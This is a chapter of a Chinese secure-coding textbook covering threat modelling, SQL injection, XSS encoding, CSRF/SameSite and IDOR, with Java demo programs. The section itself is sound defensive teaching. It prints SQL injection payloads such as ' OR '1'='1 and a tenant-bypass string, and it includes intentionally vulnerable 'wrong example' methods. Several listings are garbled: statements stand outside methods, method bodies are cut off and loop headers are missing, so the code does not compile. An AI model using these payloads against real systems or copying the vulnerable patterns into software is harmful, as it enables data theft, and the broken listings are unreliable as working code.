# 第36章 安全编码与常见漏洞防护

第35章讲清了数据怎么在网络里流动，本章讲的是"流动的数据可能被谁利用"。安全不是上线前跑一次扫描器，而是写每一行代码时的默认反应：拼 SQL 时想到参数化，输出用户内容时想到编码，查订单时想到加归属条件，存密码时想到加盐慢哈希。本章按「威胁建模 → SQL 注入 → XSS → CSRF → 越权 → 密码存储 → JWT/Session → 反序列化与 SSRF → 敏感信息泄露 → 供应链与响应头 → 综合评审」的顺序讲，每一课都先讲清漏洞原理与真实危害，再给可落地的防护写法，最后指出常见误区。所有示例仍是纯 JDK：SQL 注入用一个迷你 WHERE 求值器演示"字符串拼接"与"参数绑定"的区别，XSS 用手写编码器对比五种上下文，JWT 用 `HmacSHA256` 真签名真验签，反序列化用 `ObjectInputFilter` 真拦截，SSRF 用手写 IP 归一化识别 `127.1`/十进制/IPv6 等绕过写法，密码用 `PBKDF2WithHmacSHA256` 真实派生，全程不联网、不引第三方库。

### 36-01 安全编码原则与威胁建模

**知识点**
- **安全不是一个功能，而是一条约束**：功能是「登录能成功」，安全是「只有本人能登录成功」。写代码时每加一个入口，都要问一句「谁能调用它、他能拿到什么」。
- **STRIDE 是最好用的威胁清单**：仿冒（Spoofing）、篡改（Tampering）、抵赖（Repudiation）、信息泄露（Information Disclosure）、拒绝服务（Denial of Service）、权限提升（Elevation of Privilege）。对着这六项逐条问，比凭空想「有什么漏洞」有效得多。
- **先列资产再谈威胁**：不知道要保护什么，就没法判断什么算「泄露」。资产按影响打分（资金、合规、声誉），威胁按「可能性 × 影响」算风险，优先修高风险的。
- **信任边界是安全设计的骨架**：数据每跨过一次边界（浏览器→网关、网关→服务、服务→数据库、服务→第三方），就必须重新校验一次。**内网不等于可信**，这是大量事故的共同前提。
- **纵深防御（defense in depth）**：输入校验、输出编码、认证、授权、数据层约束、检测告警，每一层都可能被绕过，所以不能只靠一层。只做输入校验的系统，漏一个字段就全线失守。
- **默认拒绝（fail closed）**：权限判断里「拿不准」时应当拒绝，而不是放行。`if (user.isAdmin()) allow();` 后面忘了写 `else deny()`，就是默认放行。
- **最小权限**：数据库账号只给需要的表和操作；服务账号只给需要的接口；容器不以 root 运行；密钥只在需要的进程可见。
- **不要自己发明加密**：密码哈希用 bcrypt/Argon2/PBKDF2，对称加密用 AES-GCM，随机数用 `SecureRandom`。自己拼的 XOR、自己设计的「加盐规则」基本都是错的。
- **攻击面要主动收缩**：删掉不用的接口、关掉不用的端口、下线调试端点（`/actuator/env`、`/druid`）、生产环境关掉堆栈回显。
- **滥用用例（abuse case）比正常用例更能发现问题**：把每个正常流程反着写一遍 —— 改 ID、改价格、改数量为负、重复提交、换租户、超大分页。
- 易错点：把「前端校验过」当成安全（前端可绕过）；把「HTTPS」当成万能（只保护传输）；把「加了权限注解」当成授权完整（注解漏在某个新接口上就失守）；日志里打印了完整请求体（密码、token 全进日志）。

```java
import java.util.ArrayList;
import java.util.Comparator;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;


public class ThreatModel {
    enum Stride {
        SPOOFING("仿冒", "能证明「你是你」吗"),
        TAMPERING("篡改", "数据在传输或存储中被改过吗"),
        REPUDIATION("抵赖", "关键操作有不可否认的凭据吗"),
        INFO_DISCLOSURE("信息泄露", "不该看的人能看到吗"),
        DENIAL("拒绝服务", "资源会被打光吗"),
        ELEVATION("权限提升", "普通用户能变成管理员吗");

        final String cn;
        final String question;

        Stride(String cn, String question) {
            this.cn = cn;
            this.question = question;
        }
    }

    record Asset(String name, String kind, int impact) {
    }

    record Threat(Stride stride, String desc, String asset, int likelihood, int impact) {
        int risk() {
            return likelihood * impact;
        }

        String level() {
            int r = risk();
            if (r >= 16) {
                return "高";
            }
            if (r >= 9) {
                return "中";
            }
            return "低";
        }
    }

    static void strideTable() {
        System.out.println("【STRIDE：六个提问把威胁问全】");
        for (Stride s : Stride.values()) {
            System.out.printf("  %-16s %-10s %s%n", s, s.cn, s.question);
        }
        System.out.println("  对应的安全属性：机密性、完整性、可用性、认证、授权、不可否认");
        System.out.println();
    }

    static void assets() {
        System.out.println("【先列资产：不知道要保护什么，就谈不上安全】");
        List<Asset> assets = List.of(
                new Asset("用户密码", "凭据", 5),
                new Asset("订单与支付记录", "业务数据", 5),
                new Asset("身份证/手机号", "个人敏感信息", 4),
                new Asset("管理员后台", "功能入口", 5),
                new Asset("日志与监控", "运维数据", 3),
                new Asset("数据库连接串", "配置密钥", 5));
        for (Asset a : assets) {
            System.out.printf("  %-18s %-14s 影响=%d%n", a.name(), a.kind(), a.impact());
        }
        System.out.println("  影响 5 = 泄露或篡改会导致直接资金损失或合规处罚");
        System.out.println();
    }

    static void trustBoundaries() {
        System.out.println("【信任边界：数据每跨一次边界，就必须重新校验】");
        String[][] boundaries = {
                {"浏览器", "网关", "所有参数、Header、Cookie 一律不可信"},
                {"网关", "业务服务", "网关注入的身份头也要校验，内网不等于可信"},
                {"业务服务", "数据库", "SQL 必须参数化，账号只给最小权限"},
                {"业务服务", "第三方 API", "回包不可信，要校验结构与大小"},
                {"服务", "日志/消息队列", "写入前脱敏，避免二次泄露"},
        };
        for (String[] b : boundaries) {
            System.out.printf("  %-10s -> %-16s %s%n", b[0], b[1], b[2]);
        }
        System.out.println();
    }

    static void riskRanking() {
        System.out.println("【威胁清单按风险排序：先修高危】");
        List<Threat> threats = new ArrayList<>(List.of(
                new Threat(Stride.ELEVATION, "普通用户直接访问 /admin/order/list", "管理员后台", 4, 5),
                new Threat(Stride.INFO_DISCLOSURE, "订单详情只校验登录不校验归属", "订单与支付记录", 5, 4),
                new Threat(Stride.SPOOFING, "密码用 MD5 存储，撞库即可登录", "用户密码", 3, 5),
                new Threat(Stride.TAMPERING, "金额由前端传入，服务端不重算", "订单与支付记录", 3, 5),
                new Threat(Stride.DENIAL, "导出接口无频率限制", "日志与监控", 3, 3),
                new Threat(Stride.REPUDIATION, "退款操作不留操作人", "订单与支付记录", 2, 3)));
        threats.sort(Comparator.comparingInt(Threat::risk).reversed());
        for (Threat t : threats) {
            System.out.printf("  [%s] 风险=%2d  %-12s %-22s %s%n",
                    t.level(), t.risk(), t.stride().cn, t.asset(), t.desc());
        }
        System.out.println("  风险 = 可能性 × 影响；两个 3 分组合起来往往比一个 5 分更该先修");
        System.out.println();
    }

    static void abuseCases() {
        System.out.println("【滥用用例：把「正常流程」反着写一遍】");
        Map<String, String> cases = new LinkedHashMap<>();
        cases.put("登录", "换别人的手机号收验证码；爆破；用已泄露密码撞库；改返回体里的 userId");
        cases.put("下单", "改 price 字段；数量填负数；重复提交；绕过库存校验");
        cases.put("查订单", "把 orderId 逐个 +1 遍历；换 tenantId 看别人公司的数据");
        cases.put("上传", "传 .jsp/.php；改 Content-Type；超大文件；路径穿越 ../../");
        cases.put("导出", "把 pageSize 改成 100000 拉全库；并发开 100 个导出");
        cases.forEach((k, v) -> System.out.printf("  %-6s %s%n", k, v));
        System.out.println("  每写一个正常用例，就问一句「如果参数是我随便填的呢」");
        System.out.println();
    }

    static void defenseInDepth() {
        System.out.println("【纵深防御：任何一层都可能失效，所以要有下一层】");
        String[][] layers = {
                {"输入校验", "白名单、长度、类型、范围", "会被绕过：编码变形、非常规字段"},
                {"输出编码", "按上下文做 HTML/JS/URL 编码", "会被绕过：上下文判断错"},
                {"认证", "密码强度、MFA、会话管理", "会被绕过：钓鱼、撞库"},
                {"授权", "每次都校验「这个用户能不能碰这条数据」", "会被绕过：漏了某个新接口"},
                {"数据层", "参数化查询、最小权限账号、加密存储", "会被绕过：配置错误"},
                {"检测", "审计日志、告警、异常行为分析", "作用：前几层都失效时还能发现"},
        };
        for (String[] l : layers) {
            System.out.printf("  %-8s %-38s %s%n", l[0], l[1], l[2]);
        }
        System.out.println("  只做输入校验是不够的：漏一个字段就全线失守");
        System.out.println();
    }

    static void reviewQuestions() {
        System.out.println("【提交代码前自问的五个问题】");
        String[] qs = {
                "这个接口有没有鉴权？换个 userId 能不能读到别人的数据？",
                "我拼字符串进 SQL / 命令 / 模板了吗？",
                "这个字段会原样输出到页面、日志、CSV 吗？",
                "失败时返回的信息会不会泄露内部结构（表名、堆栈、版本）？",
                "这个操作重复执行两次会怎样？金额会多扣吗？",
        };
        int i = 1;
        for (String q : qs) {
            System.out.printf("  %d. %s%n", i++, q);
        }
        System.out.println();
    }

    public static void main(String[] args) {
        strideTable();
        assets();
        trustBoundaries();
        riskRanking();
        abuseCases();
        defenseInDepth();
        reviewQuestions();
    }
}
```

### 36-02 SQL 注入与参数化查询

**知识点**
- **SQL 注入的本质是「数据和代码混在一起」**：把用户输入拼进 SQL 字符串，数据库就无法区分哪部分是结构、哪部分是值。输入里带一个引号，就能提前闭合字符串，把后面的内容变成 SQL 语法。
- **参数化查询（PreparedStatement）解决的是语法层面的问题**：SQL 结构先编译定型，值后绑定，值里有什么字符都只是数据。**这是唯一可靠的解法**，不是「更安全的字符串拼接」。
- **手写转义不可靠**：把 `'` 换成 `''` 只对「字符串字面量」这一种上下文有效。数字上下文（`age = ` + 输入）、`LIKE` 的 `%`、`ORDER BY` 的列名、表名，全都转义不了。
- **占位符不能用在标识符位置**：`ORDER BY ?`、`FROM ?`、`LIMIT ?`（部分驱动可以）都不行。列名、表名、排序方向必须走**白名单**，这是注入的重灾区。
- **`LIKE` 要单独处理**：`%` 和 `_` 是通配符，用户输入里带了会扩大匹配范围。要么转义 `%`/`_`/`\` 并声明 `ESCAPE '\'`，要么接受它只是「模糊匹配」而不影响安全。
- **多租户系统必须把 `tenant_id` 一起绑进条件**：只按 `name` 查，注入一进来就能跨租户读数据。业务条件缺失和注入叠加，后果比单纯注入更严重。
- **`IN` 子句要按数量生成占位符**：`IN (?, ?, ?)`，不能用 `IN ('a,b,c')`（那是一个字符串，不是三个值）。
- **错误信息也是泄露面**：把 `SQLException` 原样返回给前端，等于把表名、列名、数据库版本送给攻击者。对外只回统一错误码，细节写进内部日志。
- **纵深防御**：数据库账号只给 `SELECT/INSERT/UPDATE` 需要的表，不给 `DROP`、不给跨库；应用层加 WAF 只能挡常见 payload，不能当唯一防线；审计慢查询与异常 SQL。
- 易错点：以为 ORM 就安全（`createNativeQuery`、字符串拼接的 `@Query` 一样能注入）；以为 `#{}` 和 `${}` 等价（MyBatis 里 `${}` 是直接拼接）；把「参数化」用在动态排序上（拼不出来就退化成拼接）。

**示例代码**
```java
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;


public class SqlInjectionDemo {
    record User(int id, String name, int age, String role, int tenant) {
    }

    static final List<User> USERS = List.of(
            new User(1, "张三", 28, "user", 7),
            new User(2, "李四", 34, "user", 7),
            new User(3, "王五", 41, "admin", 7),
            new User(4, "赵六", 22, "user", 9),
            new User(5, "孙七", 37, "admin", 9));

    /** 在引号外补空格，让 name='' OR '1'='1' 也能被切分 */
    static String normalize(String s) {
        StringBuilder sb = new StringBuilder();
        boolean inQuote = false;
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            if (ch == '\'') {
                inQuote = !inQuote;
                sb.append(ch);
                continue;
            }
            if (!inQuote && (ch == '=' || ch == '<' || ch == '>')) {
                if (sb.length() > 0 && sb.charAt(sb.length() - 1) != ' ') {
                    sb.append(' ');
                }
                sb.append(ch);
                if (i + 1 < s.length() && (s.charAt(i + 1) == '=' || s.charAt(i + 1) == '>')) {
                    sb.append(s.charAt(++i));
                }
                sb.append(' ');
                continue;
            }
            sb.append(ch);
        }
        return sb.toString();
    }

    static boolean isNumeric(String s) {
        return s != null && s.matches("-?\\d+");
    }

    static String unquote(String s) {
        if (s.length() >= 2 && s.charAt(0) == '\'' && s.charAt(s.length() - 1) == '\'') {
            return s.substring(1, s.length() - 1);
        }
        return s;
    }

    /** 取列值；不是已知列名时，若为数字字面量就原样返回（为了能演示 1=1） */
    static String column(User u, String name) {
        return switch (name.toLowerCase(Locale.ROOT)) {
            case "id" -> String.valueOf(u.id());
            case "name" -> u.name();
            case "age" -> String.valueOf(u.age());
            case "role" -> u.role();
            case "tenant_id", "tenant" -> String.valueOf(u.tenant());
            default -> isNumeric(name) ? name : null;
        };
    }

    static boolean compare(User u, String lhs, String op, String rhs) {
        String left = lhs.startsWith("'") ? unquote(lhs) : column(u, lhs);
        if (left == null) {
            return false;
        }
        String right = rhs.startsWith("'") ? unquote(rhs) : rhs;
        int cmp = isNumeric(left) && isNumeric(right)
                ? Long.compare(Long.parseLong(left), Long.parseLong(right))
                : left.compareTo(right);
        return switch (op) {
            case "=" -> cmp == 0;
            case "<>" -> cmp != 0;
            case ">" -> cmp > 0;
            case "<" -> cmp < 0;
            case ">=" -> cmp >= 0;
            case "<=" -> cmp <= 0;
            default -> false;
        };
    }

    static boolean evalCondition(User u, String cond) {
        String c = normalize(cond).trim();
        for (String op : new String[]{"<>", ">=", "<=", "=", ">", "<"}) {
            int i = c.indexOf(" " + op + " ");
            if (i < 0) {
                continue;
            }
            String lhs = c.substring(0, i).trim();
            String rhs = c.substring(i + op.length() + 2).trim();
            return compare(u, lhs, op, rhs);
        }
        return false;
    }

    /** 极简 WHERE 求值：OR 分组，组内 AND。只为演示，真实解析器必须做词法分析 */
    static boolean evalWhere(User u, String where) {
        String w = normalize(where);
        for (String orPart : w.split("(?i) OR ")) {
            boolean all = true;
            for (String andPart : orPart.split("(?i) AND ")) {
                if (!evalCondition(u, andPart)) {
                    all = false;
                    break;
                }
            }
            if (all) {
                return true;
            }
        }
        return false;
    }

    static List<User> run(String where) {
        List<User> out = new ArrayList<>();
        for (User u : USERS) {
            if (evalWhere(u, where)) {
                out.add(u);
            }
        }
        return out;
    }

    static String show(List<User> rows) {
        StringBuilder sb = new StringBuilder();
        for (User u : rows) {
            if (sb.length() > 0) {
                sb.append(", ");
            }
            sb.append(u.name()).append("(t").append(u.tenant()).append(')');
        }
        return rows.isEmpty() ? "0 行" : rows.size() + " 行：" + sb;
    }

    static void whatHappens() {
        System.out.println("【同一句查询，两种写法】");
        String normal = "张三";
        String evil = "' OR '1'='1";

        System.out.println("  正常输入 " + normal + "：");
        System.out.println("    拼接  WHERE name = '" + normal + "'");
        System.out.println("    结果  " + show(run("name = '" + normal + "'")));

        System.out.println("  恶意输入 " + evil + "：");
        String concat = "name = '" + evil + "'";
        System.out.println("    拼接  WHERE " + concat);
        System.out.println("    结果  " + show(run(concat)));

        System.out.println("  参数化 WHERE name = ?  绑定 \"" + evil + "\"");
        List<User> bound = new ArrayList<>();
        for (User u : USERS) {
            if (u.name().equals(evil)) {
                bound.add(u);
            }
        }
        System.out.println("    结果  " + show(bound) + "  <- 整段被当成一个字符串值");
        System.out.println();
    }

    static void multiTenantBreach() {
        System.out.println("【多租户隔离被一条注入打穿】");
        String evil = "' OR tenant_id=9 OR name='";
        String concat = "name = '" + evil + "' AND tenant_id = 7";
        System.out.println("  业务意图：只看本租户 7 的数据");
        System.out.println("  拼接后  WHERE " + concat);
        System.out.println("  结果    " + show(run(concat)) + "  <- 租户 9 的数据也出来了");
        System.out.println("  正确写法：WHERE name = ? AND tenant_id = ?  （两个都绑，租户号不接受前端传）");
        System.out.println();
    }

    static void quoteEscapingIsNotEnough() {
        System.out.println("【只转义引号救不了数字上下文】");
        String evil = "1 OR 1=1";
        System.out.println("  输入 " + evil + "（一个引号都没有）");
        System.out.println("  拼进 age = " + evil + "  ->  WHERE age = " + evil);
        System.out.println("  结果 " + show(run("age = " + evil)));
```

### 36-03 XSS 与输出编码

**知识点**
- **XSS 的本质是「用户输入被当成代码执行」**。浏览器拿到 HTML 后无法区分「这段是页面作者写的」还是「这段是用户填的」，只要用户数据出现在 HTML/JS/CSS/URL 的代码位置上，就会被当代码解析。
- **三种类型**：存储型（脏数据进了数据库，所有访问者中招，危害最大）、反射型（脏数据从 URL 回显到页面，靠诱导点击）、DOM 型（后端完全没参与，前端 `innerHTML = location.hash` 自己把自己打穿）。
- **按上下文编码，不是「编码一次就完事」**：HTML 正文、HTML 属性、JS 字符串、CSS、URL 参数，五种上下文的转义规则完全不同。把 `&lt;` 塞进 `onclick="..."` 里，依然能被闭合引号后执行。
- **HTML 实体编码**：`&` `<` `>` `"` `'` 至少这五个。属性值必须用引号包起来，不加引号的属性（`<div class=xxx>`）遇到空格就断了，编码也救不了。
- **富文本要用白名单**：不能只做编码（那会连 `<b>` 都显示成文本），也不能只做黑名单（`<script>` 之外还有 `<img onerror>`、`<svg onload>`、`<iframe srcdoc>` 几十种）。用成熟的净化库（如 OWASP Java HTML Sanitizer），只允许明确的标签和属性。
- **CSP 是最后一道网**：`Content-Security-Policy: default-src 'self'` 让内联脚本和外部域脚本默认失效。即使编码漏了一处，CSP 也能挡住执行。禁止 `unsafe-inline`、`unsafe-eval`。
- **`HttpOnly` 让 Cookie 读不到**：XSS 最常见的目的是偷 Cookie。给会话 Cookie 加 `HttpOnly`，JS 就取不到 `document.cookie`，能显著降低危害（但仍可代替用户发请求）。
- **`innerHTML` 是危险 API**：能用 `textContent` 就别用 `innerHTML`。前端框架的插值（Vue `{{ }}`、React `{}`）默认转义，但 `v-html`、`dangerouslySetInnerHTML` 会关掉保护，用之前必须过净化。
- **不要用 `document.write`、`eval`、`new Function`** 拼接任何用户数据。URL 里的 `javascript:` 伪协议也要拦（`<a href="javascript:...">`）。
- 易错点：只在入库时编码（导致二次编码，`&amp;lt;`）；只在输出时编码但漏了某个字段；用 `replace("<", "&lt;")` 但没处理 `>`；把 JSON 直接嵌进 `<script>` 里（`</script>` 会提前闭合）；以为「只允许数字」的字段不用管（前端校验可绕过，后端还是得转义）。

```java
public class XssEncoding {
    /** 五种上下文，各自一套转义规则 */
    enum Ctx {
        HTML_BODY("HTML 正文", "& < > \" '"),
        HTML_ATTR("HTML 属性值", "& < > \" '"),
        JS_STRING("JS 字符串", "\\ ' \" < > / 换行 U+2028 U+2029"),
        URL_PARAM("URL 参数", "除 unreserved 外全部 %XX"),
        CSS_VALUE("CSS 值", "非字母数字全部转义");

        final String name;
        final String note;

        Ctx(String name, String note) {
            this.name = name;
            this.note = note;
        }
    }

    static String htmlEscape(String s) {
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '&' -> sb.append("&amp;");
                case '<' -> sb.append("&lt;");
                case '>' -> sb.append("&gt;");
                case '"' -> sb.append("&quot;");
                case '\'' -> sb.append("&#x27;");
                default -> sb.append(c);
            }
        }
        return sb.toString();
    }

    static String jsEscape(String s) {
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> sb.append("\\\\");
                case '\'' -> sb.append("\\'");
                case '"' -> sb.append("\\\"");
                case '<' -> sb.append("\\x3c");
                case '>' -> sb.append("\\x3e");
                case '/' -> sb.append("\\/");
                case '\n' -> sb.append("\\n");
                case '\r' -> sb.append("\\r");
                case '\u2028' -> sb.append("\\u2028");
                case '\u2029' -> sb.append("\\u2029");
                default -> sb.append(c);
            }
        }
        return sb.toString();
    }

    static String urlEncode(String s) {
        StringBuilder sb = new StringBuilder();
        for (byte b : s.getBytes(java.nio.charset.StandardCharsets.UTF_8)) {
            int v = b & 0xFF;
            char c = (char) v;
            boolean unreserved = (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z')
                    || (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~';
            if (unreserved) {
                sb.append(c);
            } else {
                sb.append('%').append(String.format("%02X", v));
            }
        }
        return sb.toString();
    }

    static String cssEscape(String s) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
                sb.append(c);
            } else {
                sb.append('\\').append(Integer.toHexString(c)).append(' ');
            }
        }
        return sb.toString();
    }

    static String encode(Ctx ctx, String s) {
        return switch (ctx) {
            case HTML_BODY, HTML_ATTR -> htmlEscape(s);
            case JS_STRING -> jsEscape(s);
            case URL_PARAM -> urlEncode(s);
            case CSS_VALUE -> cssEscape(s);
        };
    }

        System.out.println("    <div>" + encode(Ctx.HTML_BODY, evil) + "</div>");
```

### 36-04 CSRF 与 SameSite

**知识点**
- **CSRF 利用的是「浏览器会自动带 Cookie」**：用户登录了 A 站，浏览器存着 A 的会话 Cookie。此时访问恶意站点 B，B 里放一个自动提交的表单指向 A 站的转账接口，浏览器照样把 A 的 Cookie 带上 —— 服务端看到的是「合法用户的合法请求」。
- **关键点：攻击者拿不到响应，但请求已经执行了**。所以「读数据」类 CSRF 危害有限，「写数据/转账/改密码」类才是重灾区。
- **CSRF Token 是标准解法**：服务端给表单下发一个随机 token（存在 session 里），提交时必须带上，服务端比对。攻击者站点读不到这个 token（同源策略），所以伪造不出来。
- **Token 要满足三条**：随机不可预测、与用户会话绑定、**一次性或有时效**。放在隐藏字段或自定义头（`X-CSRF-Token`）里，不要放在 URL（会进 Referer 和日志）。
- **SameSite 是浏览器层的兜底**：`SameSite=Lax`（默认）表示跨站 POST 不带 Cookie，跨站 GET 顶层导航才带；`Strict` 更严，任何跨站都不带；`None` 必须配 `Secure`。`Lax` 能挡住绝大多数 CSRF，但挡不住「同站不同子域」和部分老浏览器。
- **`Lax` 的例外要小心**：顶层 GET 导航会带 Cookie，所以**任何用 GET 做写操作的接口都等于自己拆了防线**。`GET /transfer?to=x&amount=100` 是设计错误。
- **双重提交 Cookie（double submit）**：token 同时放 Cookie 和请求头，服务端比对两者是否一致。不需要服务端存储，适合无状态/多实例，但要求子域完全可信（子域能写 Cookie 就能绕过）。
- **校验 `Origin` / `Referer` 是补充手段**：`Origin` 头在跨站 POST 时一定存在，直接比对白名单，简单有效。`Referer` 可能被隐私设置裁掉，不能作为唯一依据。
- **`SameSite` 与第三方场景冲突**：嵌入式支付、iframe 单点登录、跨站回调都需要 `SameSite=None; Secure`，这时必须靠 Token 防 CSRF。
- **CORS 不是 CSRF 防护**：CORS 限制的是「读响应」，CSRF 攻击根本不需要读响应。把 `Access-Control-Allow-Origin: *` 配上 `Allow-Credentials` 反而更危险。
- 易错点：只在「敏感接口」加 token，漏了新加的接口；token 复用不刷新（被 XSS 偷走后长期可用）；用 GET 做写操作；`SameSite=None` 却没配 `Secure`（Cookie 直接被丢弃）；以为 JSON 接口天然免疫（`text/plain` 表单也能发，只是拿不到响应）。

```java
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.Map;
import java.util.Set;


public class CsrfDefense {
    enum SameSite {
        STRICT("Strict", "任何跨站请求都不带"),
        LAX("Lax", "跨站 POST 不带，顶层 GET 导航带"),
        NONE("None", "总是带，必须配 Secure");

        final String header;
        final String note;

        SameSite(String header, String note) {
            this.header = header;
            this.note = note;
        }
    }

    record Cookie(String name, String value, boolean httpOnly, boolean secure, SameSite sameSite) {
        String setCookie() {
            StringBuilder sb = new StringBuilder(name + "=" + value + "; Path=/");
            if (httpOnly) {
                sb.append("; HttpOnly");
            }
            if (secure) {
                sb.append("; Secure");
            }
            return sb.append("; SameSite=").append(sameSite.header).toString();
        }

        /** 浏览器决定要不要带上这个 Cookie */
        boolean sentOn(boolean crossSite, boolean topLevelNavigation, String method) {
            if (!crossSite) {
                return true;
            }
            return switch (sameSite) {
                case STRICT -> false;
                case LAX -> topLevelNavigation && method.equals("GET");
                case NONE -> secure;
            };
        }
    }

    record Request(String method, String origin, boolean crossSite,
                   boolean topLevelNavigation, Map<String, String> cookies,
                   Map<String, String> headers, Map<String, String> form) {
        String cookie(String n) {
            return cookies.get(n);
        }

        String form(String n) {
            return form.get(n);
        }

        String header(String n) {
            return headers.get(n);
        }
    }

    /** 一个极简的「转账」接口，逐步加防护 */
    static class TransferApi {
        final Set<String> allowedOrigins = Set.of("https://shop.example.com");
        final Set<String> issuedTokens = new LinkedHashSet<>();
        final Map<String, String> sessionTokens = new LinkedHashMap<>();
        boolean requireToken;
        boolean checkOrigin;
        boolean requirePost;
        int transferred;

        void issueToken(String sessionId) {
            String token = "csrf-" + Integer.toHexString((sessionId + issuedTokens.size()).hashCode());
            issuedTokens.add(token);
            sessionTokens.put(sessionId, token);
        }

        String result(Request r) {
            if (requirePost && !r.method().equals("POST")) {
                return "405 只接受 POST";
            }
            if (checkOrigin) {
                String origin = r.header("Origin");
                if (origin == null || !allowedOrigins.contains(origin)) {
                    return "403 Origin 不在白名单：" + origin;
                }
            }
            if (requireToken) {
                String sessionId = r.cookie("SESSION");
                String expected = sessionTokens.get(sessionId);
                String provided = r.form("csrf_token");
                if (provided == null) {
                    provided = r.header("X-CSRF-Token");
                }
                if (expected == null || !expected.equals(provided)) {
                    return "403 CSRF token 缺失或不匹配";
                }
            }
            String amount = r.form("amount");
            transferred += amount == null ? 0 : Integer.parseInt(amount);
            return "200 转账成功，累计 " + transferred + " 元";
        }
    }

    static void attackScenario() {

    static void sameSiteBehavior() {
        System.out.println("【SameSite 三种取值下的 Cookie 发送行为】");
        String[][] cases = {
                {"同站 POST", "false", "false", "POST"},
                {"跨站 POST（表单提交）", "true", "false", "POST"},
                {"跨站顶层 GET（点链接）", "true", "true", "GET"},

            System.out.printf("  SameSite=%-6s %s%n", ss.header, c.setCookie());
            for (String[] t : cases) {

                boolean sent = c.sentOn(cross, top, t[3]);
                System.out.printf("      %-22s -> %s%n", t[0], sent ? "带 Cookie（有 CSRF 风险）" : "不带（安全）");
            }
        }
        System.out.println("  Lax 的漏洞：跨站顶层 GET 仍会带 Cookie，所以写操作绝不能用 GET");
        System.out.println("  None 只在 Secure 下才生效，否则浏览器直接丢弃这个 Cookie");

    }

        System.out.println();
    }

    static void doubleSubmit() {
        System.out.println("【双重提交 Cookie：无状态方案】");
```

### 36-05 越权访问与 IDOR

**知识点**
- **越权分两种**：**水平越权**（同一角色之间互相看数据，A 用户看 B 用户的订单）和**垂直越权**（低权限干高权限的事，普通用户调管理员接口）。前者更常见，后者危害更大。
- **IDOR（Insecure Direct Object Reference）** 是水平越权的典型形态：接口直接拿前端传的 `id` 去查，不校验「这条数据是不是你的」。`GET /api/order/1001` 改成 `1002` 就能看别人的单。
- **根本原因不是「id 可枚举」，而是「授权缺失」**：就算 id 换成 UUID 不可猜，只要别人把链接分享出去、或者从日志/Referer 里拿到，依然越权。UUID 只是「提高门槛」，不是防护。
- **正确姿势是「数据级授权」**：查询条件里必须带上当前用户的归属（`WHERE id = ? AND user_id = ?`），或者在查到后立刻判断 `if (!order.ownerId().equals(currentUser)) deny()`。**先鉴权再返回，不能先返回再判断**。
- **授权要集中，不要分散**：每个接口手写一遍 `if` 必然漏。用拦截器 + 注解（如 `@RequirePermission("order:read")`）、或在 Service 层统一入口做校验。**新增接口时最容易忘**，所以要让它「默认拒绝」。
- **`userId` 绝不能让前端传**：从会话/token 里取当前用户，而不是从请求参数里取。`POST /api/order?userId=1002` 这种设计等于把授权交给攻击者。
- **对象归属要贯穿到底**：列表查询、详情、修改、删除、导出、下载附件 —— 每一个能接触到该对象的入口都要校验。常见漏洞是「详情校验了，导出没校验」。
- **批量接口是高危点**：`POST /api/order/batch-delete` 传一个 id 数组，如果只校验第一个，后面全放过。必须逐个校验或一次性用 `IN` + `user_id` 条件过滤。
- **管理员接口要独立鉴权**：不能靠「前端不显示入口」。管理端点应放在独立路径 + 独立鉴权中间件 + 可选 IP 白名单。
- **间接引用（indirect reference）能降低风险**：对外暴露的 id 用「映射表」或「带签名的短期 token」，服务端反查真实 id。适合下载、分享链接等场景。
- 易错点：只校验「是否登录」不校验「是否有权」；用 `@PreAuthorize` 但 SpEL 写错（`#id == authentication.principal.id` 拿不到值）；前端隐藏按钮就以为安全；测试只用自己的账号测，从不用两个账号互测。

```java
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;


public class IdorDemo {
    record User(int id, String name, String role, int tenant) {
    }

    record Order(int id, int ownerId, int tenant, String item, int amount) {
    }

    static final List<User> USERS = List.of(
            new User(1, "张三", "user", 7),
            new User(2, "李四", "user", 7),
            new User(3, "王五", "admin", 7),
            new User(4, "赵六", "user", 9));

    static final List<Order> ORDERS = List.of(
            new Order(1001, 1, 7, "机械键盘", 399),
            new Order(1002, 2, 7, "显示器", 1299),
            new Order(1003, 1, 7, "鼠标垫", 29),
            new Order(1004, 4, 9, "耳机", 599));

    record Result(int status, String body) {
        @Override
        public String toString() {
            return status + " " + body;
        }
    }

    /** 四种实现，逐层加防护 */
    static class OrderApi {
        /** 错误示范一：完全不校验 */
        Result naive(int orderId) {
            for (Order o : ORDERS) {
                if (o.id() == orderId) {
                    return new Result(200, o.item() + " / " + o.amount() + " 元 / owner=" + o.ownerId());
                }
            }
            return new Result(404, "not found");
        }

        /** 错误示范二：只校验登录 */
        Result loginOnly(int orderId, User current) {
            if (current == null) {
                return new Result(401, "未登录");
            }
            return naive(orderId);
        }

        /** 正确：数据级授权，查询条件带归属 */
        Result scoped(int orderId, User current) {
            if (current == null) {
                return new Result(401, "未登录");
            }
            for (Order o : ORDERS) {
                if (o.id() == orderId && o.ownerId() == current.id() && o.tenant() == current.tenant()) {
                    return new Result(200, o.item() + " / " + o.amount() + " 元");
                }
            }
            return new Result(404, "not found");
        }

        /** 管理员可跨用户，但仍限制在本租户 */
        Result scopedAdmin(int orderId, User current) {
            if (current == null) {
                return new Result(401, "未登录");
            }
            for (Order o : ORDERS) {
                if (o.id() != orderId) {
                    continue;
                }
                boolean admin = current.role().equals("admin") && o.tenant() == current.tenant();
                boolean owner = o.ownerId() == current.id();
                if (admin || owner) {
                    return new Result(200, o.item() + " / " + o.amount() + " 元");
                }
            }
            return new Result(404, "not found");
        }

        /** 错误示范：userId 由前端传 */
        Result trustingParam(int orderId, int claimedUserId) {
            for (Order o : ORDERS) {
